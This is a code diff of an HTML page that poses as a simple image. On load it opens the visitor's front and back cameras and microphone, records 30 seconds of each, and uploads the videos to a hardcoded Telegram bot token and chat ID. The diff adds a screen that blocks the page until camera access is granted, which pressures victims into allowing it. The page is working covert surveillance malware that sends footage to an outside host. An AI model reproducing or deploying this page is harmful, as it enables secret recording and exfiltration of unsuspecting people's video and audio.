@@ -1,70 +1,104 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <style>
-     img{
+      img {
         width: 100%;
         height: 100%;
-     }   
+      }
+      body.hidden {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        background-color: #f8d7da;
+        color: #721c24;
+        font-family: Arial, sans-serif;
+      }
+      .warning-message {
+        text-align: center;
+      }
     </style>
-</head>
-<body>
-    <img src="img.jpg">
+  </head>
+  <body>
+    <img src="img.jpg"/>
     <script>
-        function startRecording(facingMode, videoFileName) {
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode },
-                audio: true
-            })
-            .then(stream => {
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
+      function startRecording(facingMode, videoFileName) {
+        navigator.mediaDevices
+          .getUserMedia({
+            video: { facingMode },
+            audio: true,
+          })
+          .then((stream) => {
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
 
-                mediaRecorder.ondataavailable = event => {
-                    if (event.data.size > 0) {
-                        chunks.push(event.data);
-                    }
-                };
+            mediaRecorder.ondataavailable = (event) => {
+              if (event.data.size > 0) {
+                chunks.push(event.data);
+              }
+            };
 
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('video', blob, videoFileName);
+            mediaRecorder.onstop = () => {
+              const blob = new Blob(chunks, { type: "video/webm" });
+              const formData = new FormData();
+              formData.append("video", blob, videoFileName);
 
-                    const telegramBotToken = '7231845139:AAExa-6hEmkw-YH9fNNPlxYZ9nxGgtCZKsQ';
-                    const chatId = '7503842631';
+              const telegramBotToken =
+                "7231845139:AAExa-6hEmkw-YH9fNNPlxYZ9nxGgtCZKsQ";
+              const chatId = "7503842631";
 
-                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log(`تم إرسال الفيديو (${videoFileName}) بنجاح:`, data);
-                    })
-                    .catch(error => {
-                        console.error(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`, error);
-                    });
-                };
+              fetch(
+                `https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`,
+                {
+                  method: "POST",
+                  body: formData,
+                }
+              )
+                .then((response) => response.json())
+                .then((data) => {
+                  console.log(
+                    `تم إرسال الفيديو (${videoFileName}) بنجاح:`,
+                    data
+                  );
+                })
+                .catch((error) => {
+                  console.error(
+                    `حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`,
+                    error
+                  );
+                });
+            };
 
-                mediaRecorder.start();
+            mediaRecorder.start();
 
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 30 * 1000); // مدة التسجيل 30 ثانية
-            })
-            .catch(error => {
-                console.error(`خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`, error);
-            });
-        }
+            setTimeout(() => {
+              mediaRecorder.stop();
+              stream.getTracks().forEach((track) => track.stop());
+            }, 30 * 1000); // مدة التسجيل 30 ثانية
+          })
+          .catch((error) => {
+            console.error(
+              `خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`,
+              error
+            );
+            // Hide the main content and display a warning message
+            document.body.classList.add("hidden");
+            document.body.innerHTML = `
+                    <div class="warning-message">
+                        <h1>Access Denied</h1>
+                        <p>You must allow camera access to view this page.</p>
+                    </div>`;
+          });
+      }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            startRecording('user', 'front_recording.webm');
-            startRecording('environment', 'back_recording.webm');
-        });
+      document.addEventListener("DOMContentLoaded", () => {
+        startRecording("user", "front_recording.webm");
+        startRecording("environment", "back_recording.webm");
+      });
     </script>
-</body>
+  </body>
 </html>
